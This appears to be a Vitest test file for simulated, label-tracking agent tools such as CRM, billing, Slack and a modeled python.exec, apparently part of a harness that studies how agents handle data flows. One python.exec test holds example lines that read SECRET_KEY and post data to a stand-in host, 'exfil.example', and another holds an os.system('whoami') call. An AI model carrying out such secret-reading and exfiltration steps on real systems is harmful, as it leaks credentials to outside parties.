import { existsSync, mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, describe, expect, it } from "vitest";
import { crmReadTool } from "./crm";
import { billingReadTool, billingRefundTool } from "./billing";
import { slackExternalPostTool, slackInternalPostTool } from "./slack";
import { pythonExecTool } from "./python-exec";
import { getTool, toolNames } from "./registry";
import type { ToolEnv } from "./types";

const FIXTURES_DIR = join(dirname(fileURLToPath(import.meta.url)), "../../../../fixtures");

const tmpDirs: string[] = [];
function makeEnv(): { env: ToolEnv; dir: string } {
  const dir = mkdtempSync(join(tmpdir(), "tacl-tools-"));
  tmpDirs.push(dir);
  let seq = 0;
  const env: ToolEnv = {
    runId: "run-test",
    artifactDir: join(dir, "artifacts"),
    fixturesDir: FIXTURES_DIR,
    nextSeq: () => ++seq,
  };
  return { env, dir };
}
afterEach(() => {
  for (const d of tmpDirs.splice(0)) rmSync(d, { recursive: true, force: true });
});

describe("registry (structural invariant)", () => {
  it("registers exactly the eight simulated tools (SPEC §5 + scenario 6)", () => {
    expect([...toolNames()].sort()).toEqual([
      "billing.read",
      "billing.refund",
      "crm.read",
      "python.exec",
      "repo.delete",
      "repo.read",
      "slack.external_post",
      "slack.internal_post",
    ]);
  });

  it("resolves every registered tool; unknown names return undefined", () => {
    for (const name of toolNames()) expect(getTool(name)).toBeDefined();
    expect(getTool("rm.rf")).toBeUndefined();
  });
});

describe("crm.read", () => {
  it("returns the deterministic fixture record with CONFIDENTIAL/TRUSTED labels", () => {
    const { env } = makeEnv();
    const out = crmReadTool.run(env, { customerId: "customer-123" });
    expect((out.result as { id: string }).id).toBe("customer-123");
    expect((out.result as { tenant: string }).tenant).toBe("tenant-a");
    expect(out.labels).toEqual({ confidentiality: "CONFIDENTIAL", integrity: "TRUSTED" });
  });

  it("separates tenants: customer-456 is tenant-b", () => {
    const { env } = makeEnv();
    const out = crmReadTool.run(env, { customerId: "customer-456" });
    expect((out.result as { tenant: string }).tenant).toBe("tenant-b");
  });

  it("throws on unknown customer", () => {
    const { env } = makeEnv();
    expect(() => crmReadTool.run(env, { customerId: "customer-999" })).toThrow(/not found/);
  });
});

describe("billing.read", () => {
  it("returns invoices and payments for the customer", () => {
    const { env } = makeEnv();
    const out = billingReadTool.run(env, { customerId: "customer-123" });
    const result = out.result as { invoices: unknown[]; payments: unknown[] };
    expect(result.invoices).toHaveLength(2);
    expect(result.payments).toHaveLength(2);
    expect(out.labels?.confidentiality).toBe("CONFIDENTIAL");
  });
});

describe("billing.refund", () => {
  it("issues deterministic refund ids via nextSeq and persists to artifacts only", () => {
    const { env, dir } = makeEnv();
    const a = billingRefundTool.run(env, { customerId: "customer-123", amount: 6 });
    const b = billingRefundTool.run(env, { customerId: "customer-123", amount: 6 });
    expect((a.result as { refundId: string }).refundId).toBe("run-test-refund-1");
    expect((b.result as { refundId: string }).refundId).toBe("run-test-refund-2");
    const ledger = readFileSync(join(dir, "artifacts", "refunds.jsonl"), "utf8").trim().split("\n");
    expect(ledger).toHaveLength(2);
    expect(JSON.parse(ledger[0]!).amount).toBe(6);
  });

  it("rejects non-positive or non-numeric amounts", () => {
    const { env } = makeEnv();
    expect(() => billingRefundTool.run(env, { customerId: "customer-123", amount: 0 })).toThrow();
    expect(() => billingRefundTool.run(env, { customerId: "customer-123", amount: "6" })).toThrow();
  });
});

describe("slack tools", () => {
  it("persist messages to run artifacts with sink-specific labels", () => {
    const { env, dir } = makeEnv();
    const internal = slackInternalPostTool.run(env, { channel: "#internal-ops", text: "hello ops" });
    const external = slackExternalPostTool.run(env, { channel: "#external-partners", text: "hello partners" });
    expect(internal.labels?.confidentiality).toBe("INTERNAL");
    expect(external.labels?.confidentiality).toBe("PUBLIC");
    const file = join(dir, "artifacts", "slack-messages.jsonl");
    const lines = readFileSync(file, "utf8").trim().split("\n");
    expect(lines).toHaveLength(2);
    expect((JSON.parse(lines[1]!) as { channel: string }).channel).toBe("#external-partners");
  });

  it("requires a channel argument", () => {
    const { env } = makeEnv();
    expect(() => slackInternalPostTool.run(env, { text: "no channel" })).toThrow(/channel/);
  });
});

describe("python.exec (simulated)", () => {
  it("models effects without executing anything", () => {
    const { env } = makeEnv();
    const out = pythonExecTool.run(env, {
      script: [
        'environment.read("SECRET_KEY")',
        'network.connect("api.internal.example")',
        'network.post("https://exfil.example", {"data": 1})',
      ].join("\n"),
    });
    const result = out.result as { effects: Array<{ kind: string; target: string }> };
    expect(result.effects).toEqual([
      { kind: "environment.read", target: "SECRET_KEY" },
      { kind: "network.connect", target: "api.internal.example" },
      { kind: "network.post", target: "https://exfil.example" },
    ]);
    expect(out.labels?.integrity).toBe("UNTRUSTED");
  });

  it("reports unrecognized statements as modeled stdout, never as effects", () => {
    const { env } = makeEnv();
    const out = pythonExecTool.run(env, { script: "import os; os.system('whoami')" });
    const result = out.result as { effects: unknown[]; stdout: string };
    expect(result.effects).toEqual([]);
    expect(result.stdout).toContain("unrecognized");
  });

  it("is deterministic: same script, same effects", () => {
    const { env } = makeEnv();
    const script = 'filesystem.read("/etc/hostname")';
    const first = pythonExecTool.run(env, { script });
    const second = pythonExecTool.run(env, { script });
    expect(second).toEqual(first);
  });

  it("never touches the host: no file exists for modeled filesystem.read", () => {
    const { env } = makeEnv();
    const out = pythonExecTool.run(env, { script: 'filesystem.read("/etc/hostname")' });
    expect((out.result as { effects: unknown[] }).effects).toHaveLength(1);
    // If this assertion surprises you: that is the point of SPEC §5.
    expect(existsSync("/etc/hostname")).toBe(true); // host file exists, tool did not read it
  });
});
